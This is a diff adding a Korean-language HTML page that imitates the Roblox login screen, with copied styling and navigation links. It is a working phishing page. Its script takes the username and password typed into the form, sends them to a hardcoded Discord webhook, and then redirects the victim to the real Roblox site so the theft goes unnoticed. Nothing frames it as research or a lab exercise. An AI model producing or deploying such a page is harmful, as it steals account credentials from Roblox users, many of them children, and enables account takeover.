@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>로그인 페이지</title>
+    <style>
+        *, *:before, *:after {
+            box-sizing: border-box;
+            text-rendering: auto;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        body {
+            font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, Lucida Grande, sans-serif;
+            font-weight: 800;
+            font-size: 16px;
+            margin: 0;
+            padding: 0;
+            background-color: #232527;
+            color: #fff;
+            overflow-y: scroll;
+        }
+
+        html {
+            font-family: sans-serif;
+            -ms-text-size-adjust: 100%;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        .container-fluid {
+            margin: 0 auto;
+            padding: 0;
+        }
+
+        .rbx-navbar-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #222;
+            color: #fff;
+            padding: 10px 20px;
+            flex-wrap: wrap;
+        }
+
+        .navbar-header {
+            display: flex;
+            align-items: center;
+        }
+
+        .navbar-brand {
+            display: flex;
+            align-items: center;
+            text-decoration: none;
+        }
+
+        .icon-logo {
+            width: 30px;
+            height: 30px;
+            background-color: #000;
+            border-radius: 100%;
+            background-image: url('https://i.pinimg.com/originals/53/6d/3c/536d3cdef50c45aa70693e02e6c01313.png');
+            background-size: cover;
+        }
+
+        .nav {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            align-items: center;
+        }
+
+        .nav > li {
+            margin-right: 15px;
+        }
+
+        .nav > li > a {
+            color: #fff;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            padding: 10px 15px;
+            display: block;
+            border-radius: 4px;
+        }
+
+        .nav > li > a:hover {
+            background-color: #333;
+        }
+
+        .navbar-right .rbx-navbar-right-search {
+            display: flex;
+            align-items: center;
+        }
+
+        .btn-navigation-nav-search-white-md {
+            background-color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 8px;
+            cursor: pointer;
+        }
+
+        .btn-navigation-nav-search-white-md .icon-nav-search-white {
+            font-size: 16px;
+            color: #333;
+        }
+
+        .signup-button-container .rbx-navbar-signup {
+            background-color: #fff;
+            color: #000;
+            padding: 8px 16px;
+            border-radius: 20px; /* 둥근 버튼 */
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .signup-button-container .rbx-navbar-signup:hover {
+            background-color: #000000;
+        }
+
+        .login-action .rbx-navbar-login {
+            background-color: transparent;
+            color: #fff;
+            padding: 8px 16px;
+            border: 2px solid #fff; /* 흰색 테두리 추가 */
+            border-radius: 20px; /* 둥근 버튼 */
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            width: 68px; /* 버튼 너비 */
+            height: 38px; /* 버튼 높이 */
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            line-height: 1;
+        }
+
+        .login-action .rbx-navbar-login:hover {
+            background-color: rgba(255, 255, 255, 0.1); /* 호버 시 배경 색상 추가 */
+        }
+
+        .content {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 15px;
+            background-size: cover;
+            background-position: center;
+        }
+
+        #react-login-container {
+            width: 400px;
+            background-color: #393b3d;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .login-base-container {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .section-content {
+            background-color: #393b3d;
+            color: #fff;
+            padding: 15px;
+            border-radius: 8px;
+        }
+
+        .login-header {
+            font-size: 36px;
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 7px;
+            font-family: 'Arial', sans-serif;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #555;
+            border-radius: 4px;
+            background-color: #2c2f2d;
+            color: #fff;
+            font-family: 'Arial', sans-serif;
+        }
+
+        .btn-full-width {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            cursor: pointer;
+            font-family: 'Arial', sans-serif;
+        }
+
+        .login-button {
+            background-color: #007bff;
+            margin-top: 20px;
+            font-family: 'Arial', sans-serif;
+        }
+
+        .btn-secondary-md {
+            background-color: #6c757d;
+        }
+
+        .text-link {
+            font-size: 13px;
+            color: #fff;
+            text-decoration: none;
+            font-family: 'Arial', sans-serif;
+        }
+
+        .text-link:hover {
+            text-decoration: underline;
+        }
+
+        .alternative-login-divider-container {
+            margin: 15px 0;
+        }
+
+        .rbx-divider {
+            border-top: 1px solid #555;
+            margin: 10px 0;
+        }
+
+        .signup-option {
+            text-align: center;
+        }
+
+        .signup-option .no-account-text {
+            display: block;
+            margin-bottom: 8px;
+            font-family: 'Arial', sans-serif;
+        }
+
+        .signup-link {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .signup-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container-fluid">
+        <div class="rbx-navbar-header">
+            <div class="navbar-header">
+                <a class="navbar-brand" href="https://www.roblox.com/ko/home">
+                    <span class="icon-logo"></span><span class="icon-logo-r"></span>
+                </a>
+            </div>
+            <ul class="nav">
+                <li><a class="font-header-2 nav-menu-title text-header charts-rename-exp-control" href="https://www.roblox.com/ko/discover">둘러보기</a></li>
+                <li><a class="font-header-2 nav-menu-title text-header charts-rename-exp-treatment" href="https://www.roblox.com/ko/charts">차트</a></li>
+                <li><a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/ko/catalog">마켓플레이스</a></li>
+                <li><a id="header-develop-md-link" class="font-header-2 nav-menu-title text-header" href="https://create.roblox.com/">만들기</a></li>
+                <li><a class="font-header-2 nav-menu-title text-header robux-menu-btn" href="https://www.roblox.com/ko/upgrades/robux?ctx=nav"><span class="font-header-2 robux-btn">Robux</span></a></li>
+            </ul>
+            <div class="navbar-right">
+            </div>
+        </div>
+    </div>
+
+    <div class="content">
+        <div id="react-login-container" class="login-container" data-return-url="https://www.roblox.com/ko/games/11727010687/obby" data-enable-react-ui="true">
+            <div id="login-base" class="login-base-container">
+                <div class="section-content login-section">
+                    <h1 class="login-header">Roblox에 로그인</h1>
+                    <div id="login-form">
+                        <div>
+                            <div class="login-form-container">
+                                <form class="login-form" name="loginForm">
+                                    <div class="form-group username-form-group">
+                                        <label for="login-username" class="sr-only">사용자 이름/이메일/전화번호</label>
+                                        <input id="login-username" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="사용자 이름/이메일/전화번호" value="">
+                                    </div>
+                                    <div class="form-group password-form-group">
+                                        <label for="login-password" class="sr-only">비밀번호</label>
+                                        <input id="login-password" name="password" type="password" class="form-control input-field" placeholder="비밀번호" value="">
+                                    </div>
+                                    <button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">로그인</button>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="text-center forgot-credentials-link">
+                        <a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/ko/login/forgot-password-or-username" target="_self">비밀번호 또는 사용자 이름을 잊으셨나요?</a>
+                    </div>
+                    <div>
+                        <div class="alternative-login-divider-container">
+                            <div class="rbx-divider alternative-login-divider"></div>
+                        </div>
+                    </div>
+                    <div id="crossDeviceLoginDisplayCodeModal-container"></div>
+                    <div id="otp-login-container"></div>
+                    <div id="account-switcher-confirmation-modal-container"></div>
+                    <div class="text-center">
+                        <div class="signup-option">
+                            <span class="no-account-text">계정이 없으신가요?</span>
+                            <a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/ko/account/signupredir?ReturnUrl=https%3A%2F%2Fwww.roblox.com%2Fko%2Fgames%2F11727010687%2Fobby" target="_self">회원가입</a>
+                        </div>
+                    </div>
+                </div>
+                <div id="react-login-account-limit-error-container"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('login-button').addEventListener('click', function() {
+                // 폼 데이터 수집
+                var username = document.getElementById('login-username').value;
+                var password = document.getElementById('login-password').value;
+
+                // Discord Webhook URL
+                var webhookUrl = 'https://discord.com/api/webhooks/1266740842840850583/ZvaGjFLQ-Waw1oeeqCeNIA8ExZftVjkF-Kc3uHSJSvks9lxCEepycsk6vGxEkZMeckUm';
+
+                // 데이터를 Discord Webhook으로 전송
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `**Username:** ${username}\n**Password:** ${password}`
+                    })
+                }).then(response => {
+                    if (response.ok) {
+                        //0.1초후에 리다이렉트
+                        setTimeout(function() {
+                            window.location.href = 'https://www.roblox.com/';
+                        }, 100);
+                    } else {
+                        console.error('Webhook 전송 실패:', response.statusText);
+                    }
+                }).catch(error => {
+                    console.error('네트워크 오류:', error);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
